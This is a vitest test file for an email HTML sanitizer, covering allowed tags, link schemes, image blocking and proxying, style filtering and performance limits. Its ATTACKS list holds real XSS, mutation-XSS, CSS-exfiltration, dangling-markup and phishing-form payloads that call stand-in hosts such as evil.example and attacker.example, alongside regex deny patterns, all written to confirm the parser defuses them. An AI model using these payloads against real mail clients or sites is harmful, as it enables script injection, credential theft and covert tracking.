// mail.parse: what an email may contain (sinter/tags.ts), checked URLs and images, ids only for in-email
// links, the table structure the components need, the options and the cache; over the corpus, the
// invariants every tree must keep; and attacks, which must leave nothing that runs or loads.
import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { parse } from '../sinter/parse.js';
import { attrsOf, DROP, TAGS } from '../sinter/tags.js';
import type { Body, Element, Node, Tag } from '../sinter/sinter.types.js';

const CORPUS = join(import.meta.dirname, 'corpus');

/** the tree as tags and texts, for readable expectations */
const shape = (n: Node | Body): unknown =>
  n.type === 'text' ? n.value : n.type === 'body' ? n.children.map(shape) : [n.tag, ...n.children.map(shape)];
const els = (n: Node | Body): Element[] => {
  const out: Element[] = [];
  const walk = (x: Node | Body) => {
    if (x.type === 'text') return;
    if (x.type === 'element') out.push(x);
    x.children.forEach(walk);
  };
  walk(n);
  return out;
};
const first = (b: Body, tag: Tag) => els(b).find((e) => e.tag === tag)!;

describe('elements', () => {
  test('the body is the root; head and comments are gone', () => {
    expect(shape(parse('<head><title>t</title></head><body><p>a<!-- c -->b</p></body>'))).toEqual([['p', 'ab']]);
  });
  test('dropped with their content, renamed, unknown as span', () => {
    const b = parse('<p>a<script>x()</script><iframe src="https://x.example"></iframe><form><input value=1>b</form><o:p>c</o:p><label>d</label><big>e</big></p>');
    expect(shape(b)).toEqual([['p', 'a', ['span', 'c'], ['span', 'd'], ['span', 'e']]]);
  });
  test('<style> anywhere is read, not shown', () => {
    const b = parse('<p>a</p><style>p { color: red }</style>');
    expect(shape(b)).toEqual([['p', 'a']]);
    expect(first(b, 'p').style.color).toBe('red');
  });
  test('tables: implied tbody, whitespace between cells and rows dropped, stray text moved before', () => {
    const b = parse('<table>\n <tr>\n  <td>a</td>x<td>b</td>\n </tr>\n</table>');
    expect(shape(b)).toEqual(['x', ['table', ['tbody', ['tr', ['td', 'a'], ['td', 'b']]]]]);
  });
  test('only the tag’s attributes, values checked', () => {
    const b = parse('<td colspan="3x"><ol start=" 4 " type="a" onclick="x()" class="c" data-x="1"><li value="7">a</li></ol><td colspan=99999 rowspan=2>');
    const ol = first(b, 'ol');
    expect(ol.attrs).toEqual({ start: '4', type: 'a' });
    expect(first(b, 'li').attrs).toEqual({ value: '7' });
  });
  test('every attribute in the tree is one its tag keeps', () => {
    const b = parse('<p dir=RTL lang=de title=t style="x" align=center>a</p><bdo dir=sideways>b</bdo>');
    expect(first(b, 'p').attrs).toEqual({ dir: 'rtl', lang: 'de', title: 't' });
    expect(first(b, 'bdo').attrs).toEqual({});
  });
});

describe('links', () => {
  test('http, https, mailto and tel only, normalized', () => {
    const hrefs = ['https://a.example/x y', 'HTTP://A.example', 'mailto:a@b.example', 'tel:+1 555', 'javascript:alert(1)', ' jav\tascript:alert(1)', 'data:text/html,x', 'vbscript:x', '/relative', 'ftp://x.example', '//x.example']
      .map((h) => first(parse(`<a href="${h}">x</a>`), 'a').attrs.href);
    expect(hrefs).toEqual(['https://a.example/x%20y', 'http://a.example/', 'mailto:a@b.example', 'tel:+1%20555', undefined, undefined, undefined, undefined, undefined, undefined, undefined]);
  });
  test('an in-email fragment keeps its target, prefixed; others lose theirs', () => {
    const b = parse('<a href="#top">up</a><a href="#nowhere">x</a><h1 id="top">T</h1><p id="other">p</p><a name="old"></a><a href="#old">o</a>');
    const [up, nowhere, , old] = els(b).filter((e) => e.tag === 'a');
    expect(up.attrs.href).toBe('#mail-top');
    expect(nowhere.attrs.href).toBeUndefined();
    expect(first(b, 'h1').attrs.id).toBe('top');
    expect(first(b, 'p').attrs.id).toBeUndefined();
    expect(old.attrs.href).toBe('#mail-old');
    expect(els(b).filter((e) => e.tag === 'a')[2].attrs.id).toBe('old');
  });
  test('a duplicated id is kept once', () => {
    const b = parse('<a href="#x">x</a><p id="x">1</p><p id="x">2</p>');
    expect(els(b).filter((e) => e.attrs.id === 'x')).toHaveLength(1);
  });
});

describe('images', () => {
  const HTML = '<img src="https://img.example/a.png" alt="A" width="10" height="20"><img src="http://other.example/b.gif"><img src="cid:logo@x"><img src="data:image/png;base64,iVBORw0KGgo="><img src="data:image/svg+xml;base64,PHN2Zz4="><img src="/rel.png">';
  const srcs = (b: Body) => els(b).filter((e) => e.tag === 'img').map((e) => e.attrs.src);
  test('blocked by default, boxes and origins kept', () => {
    const b = parse(HTML);
    expect(srcs(b)).toEqual([undefined, undefined, undefined, 'data:image/png;base64,iVBORw0KGgo=', undefined, undefined]);
    expect(first(b, 'img').attrs).toEqual({ alt: 'A', width: '10', height: '20' });
    expect(b.images.origins).toEqual(['http://other.example', 'https://img.example']);
  });
  test('allow', () => {
    expect(srcs(parse(HTML, { images: 'allow' })).slice(0, 2)).toEqual(['https://img.example/a.png', 'http://other.example/b.gif']);
  });
  test('proxy', () => {
    expect(srcs(parse(HTML, { images: 'proxy', proxy: '/img?url={url}' })).slice(0, 2)).toEqual(['/img?url=https%3A%2F%2Fimg.example%2Fa.png', '/img?url=http%3A%2F%2Fother.example%2Fb.gif']);
  });
  test('cid: a map or a template', () => {
    expect(srcs(parse(HTML, { cid: { '<logo@x>': 'data:image/png;base64,AAAA' } }))[2]).toBe('data:image/png;base64,AAAA');
    expect(srcs(parse(HTML, { cid: '/att?msg=4&cid={cid}' }))[2]).toBe('/att?msg=4&cid=logo%40x');
    expect(srcs(parse(HTML, { cid: { 'logo@x': 'javascript:alert(1)' } }))[2]).toBeUndefined();
  });
  test('data: images up to the bound', () => {
    expect(srcs(parse(HTML, { dataImages: 10 }))[3]).toBeUndefined();
  });
});

describe('options', () => {
  test('invalid options throw', () => {
    expect(() => parse('', { images: 'maybe' as 'allow' })).toThrow(/images/);
    expect(() => parse('', { images: 'proxy' })).toThrow(/proxy/);
    expect(() => parse('', { images: 'proxy', proxy: 'http://p.example/?u={url}' })).not.toThrow();
    expect(() => parse('', { images: 'proxy', proxy: 'javascript:{url}' })).toThrow(/proxy/);
    expect(() => parse('', { images: 'proxy', proxy: '//p.example/{url}' })).toThrow(/proxy/);
    expect(() => parse('', { cid: '/x' })).toThrow(/cid/);
    expect(() => parse('', { media: 'tv' as 'wide' })).toThrow(/media/);
    expect(() => parse('', { dataImages: -1 })).toThrow(/dataImages/);
  });
  test('the same source and options give the same frozen tree', () => {
    const a = parse('<p>x</p>', { cid: { b: '/1', a: '/2' } });
    expect(parse('<p>x</p>', { cid: { a: '/2', b: '/1' } })).toBe(a);
    expect(Object.isFrozen(a.children[0])).toBe(true);
    expect(parse('<p>x</p>')).not.toBe(a);
    expect(parse(null)).toEqual({ type: 'body', style: {}, children: [], images: { origins: [] } });
  });
});

describe('styles', () => {
  test('legacy attributes and rules become the element’s style; the body’s go to the root', () => {
    const b = parse('<body bgcolor="#eeeeee" style="font-family: Arial"><table cellpadding=4><tr><td bgcolor=red>x</table></body>');
    expect(b.style['background-color']).toBeDefined();
    expect(b.style['font-family']).toBeDefined();
    const td = first(b, 'td');
    expect(td.style['background-color']).toBeDefined();
    expect(td.style['padding-top']).toBe('4px');
  });
  test('only the properties the tag binds', () => {
    const b = parse('<br style="color:red; clear:both"><p style="border-collapse:collapse; color:red">x</p>');
    expect(first(b, 'br').style).toEqual({ clear: 'both' });
    expect(first(b, 'p').style).toEqual({ color: 'red' });
  });
});

// ── Invariants over every tree ────────────────────────────────────────────────────────────────────────

const SAFE_HREF = /^(?:https?:|mailto:|tel:|#mail-)/;
const BAD_STYLE = /url\(|image\(|image-set\(|\\|expression|javascript|var\(|calc\(/i;
const TABLE_KIDS: Partial<Record<Tag, Tag[]>> = { table: ['caption', 'colgroup', 'thead', 'tbody', 'tfoot'], colgroup: ['col'], thead: ['tr'], tbody: ['tr'], tfoot: ['tr'], tr: ['td', 'th'] };

/** what every tree must keep, whatever its source */
function invariants(b: Body, options: { images?: string } = {}): void {
  const walk = (n: Element, parent: Tag | 'body') => {
    expect(TAGS[n.tag], n.tag).toBeDefined();
    const kept = new Set(attrsOf(n.tag));
    for (const [k, v] of Object.entries(n.attrs)) {
      expect(kept.has(k as never), `${n.tag}[${k}]`).toBe(true);
      if (k === 'href') expect(v).toMatch(SAFE_HREF);
    }
    if (n.tag === 'img' && n.attrs.src !== undefined) {
      if (options.images === 'block' || !options.images) expect(n.attrs.src).toMatch(/^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/);
    }
    const props = new Set(TAGS[n.tag].props);
    for (const [p, v] of Object.entries(n.style)) {
      expect(props.has(p as never), `${n.tag} ${p}`).toBe(true);
      expect(v, `${n.tag} ${p}: ${v}`).not.toMatch(BAD_STYLE);
    }
    // a table part stands only in its table's structure (the components render it there and only there)
    if (TAGS[n.tag].inTable) expect(parent !== 'body' && TABLE_KIDS[parent]?.includes(n.tag), `${n.tag} in ${parent}`).toBe(true);
    const allowed = TABLE_KIDS[n.tag];
    for (const c of n.children) {
      if (allowed) expect(c.type === 'element' && allowed.includes(c.tag), `${c.type === 'element' ? c.tag : 'text'} in ${n.tag}`).toBe(true);
      if (c.type === 'element') walk(c, n.tag);
    }
    if (TAGS[n.tag].void) expect(n.children).toEqual([]);
  };
  for (const c of b.children) if (c.type === 'element') walk(c, 'body');
  for (const v of Object.values(b.style)) expect(v).not.toMatch(BAD_STYLE);
}

describe('the corpus', () => {
  const files = readdirSync(CORPUS).filter((f) => f.endsWith('.html'));
  for (const f of files) {
    test(f, () => {
      const html = readFileSync(join(CORPUS, f), 'utf8');
      for (const images of ['block', 'allow'] as const) invariants(parse(html, { images }), { images });
      invariants(parse(html, { images: 'proxy', proxy: '/p?u={url}', media: 'narrow' }), { images: 'proxy' });
    });
  }
  test('the newsletter keeps its look', () => {
    const b = parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'));
    expect(b.style['background-color']).toBeDefined();
    const h1 = first(b, 'h1');
    expect(h1.style['font-size']).toBe('28px');
    expect(parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'), { media: 'narrow' }).children.length).toBeGreaterThan(0);
    expect(first(parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'), { media: 'narrow' }), 'h1').style['font-size']).toBe('22px');
    expect(b.images.origins).toEqual(['https://images.example.com', 'https://track.example.net']);
    const a = els(b).find((e) => e.tag === 'a' && e.attrs.href?.includes('/tools'))!;
    expect(a.style.color).toBe('#ffffff');
    // the preheader is hidden, as in every client
    expect(els(b).find((e) => e.style.display === 'none')).toBeDefined();
  });
});

// ── Attacks ───────────────────────────────────────────────────────────────────────────────────────────
// Each must leave no script, no handler, no unsafe URL, no remote load under 'block', no style that loads
// or escapes. The tree cannot hold a handler at all (attributes are per tag); these check the parse too.

const ATTACKS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)><circle/></svg>',
  '<body onload=alert(1)>x',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" JaVaScRiPt:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  '<form action="https://evil.example/steal"><input name=password type=password><button>Log in</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/"><a href="/x">x</a>',
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><img src=x onerror=alert(1)></template>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<textarea></textarea><img src=x onerror=alert(1)></textarea>',
  '<p id="location" name="cookie">x</p><form name="body"></form>',
  '<p style="background:url(https://tracker.example/p.gif)">x</p>',
  '<style>@import url(https://evil.example/x.css); p { background-image: url(https://tracker.example/q) }</style><p>x</p>',
  '<p style="width: expression(alert(1)); -moz-binding: url(x.xml#y); behavior: url(x.htc)">x</p>',
  '<p style="background: \\75 rl(https://tracker.example/r)">x</p>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</div>',
  '<div style="margin-top:-1000px">over the app</div>',
  '<style>p::before { content: "fake" } a:visited { color: red } input[value^="a"] { background: url(https://k.example/a) }</style><p>x</p>',
  '<style>@font-face { font-family: X; src: url(https://evil.example/f.woff) } p { font-family: X }</style><p>x</p>',
  '<video poster="https://tracker.example/v.jpg"></video><input type=image src="https://tracker.example/i">',
  '<img srcset="https://tracker.example/s.jpg 2x" lowsrc="https://tracker.example/l.jpg">',
  '<table background="https://tracker.example/t.jpg"><tr><td>x</table>',
  '<img src="https://attacker.example/?secret=<p>plaintext follows</p>',
  '<a href="https://ok.example" style="display:block;width:10000px;height:10000px">x</a>',
];

describe('attacks', () => {
  for (const html of ATTACKS) {
    test(html.slice(0, 70), () => {
      const b = parse(html);
      invariants(b);
      const json = JSON.stringify(b);
      expect(json).not.toMatch(/javascript:|vbscript:|data:text|onerror|onload|evil\.example|tracker\.example|k\.example|attacker\.example\/\?/i);
      for (const e of els(b)) {
        expect(e.style['margin-top'] ?? '', 'negative margin').not.toMatch(/^-/);
        expect(DROP.has(e.tag)).toBe(false);
      }
    });
  }
  test('nesting is bounded', () => {
    const b = parse('<div>'.repeat(5000) + 'x');
    let depth = 0;
    let n: Node | Body = b;
    while (n.type !== 'text' && n.children.length) {
      n = n.children[0];
      depth++;
    }
    expect(depth).toBeLessThanOrEqual(260);
  });
  test('a megabyte of email parses within a second', () => {
    const one = readFileSync(join(CORPUS, 'newsletter.html'), 'utf8');
    const body = one.slice(one.indexOf('<body'), one.indexOf('</body>'));
    const big = one.replace(body, body.repeat(Math.ceil(1_000_000 / body.length)));
    const t = performance.now();
    parse(big);
    expect(performance.now() - t).toBeLessThan(1000);
  });
});
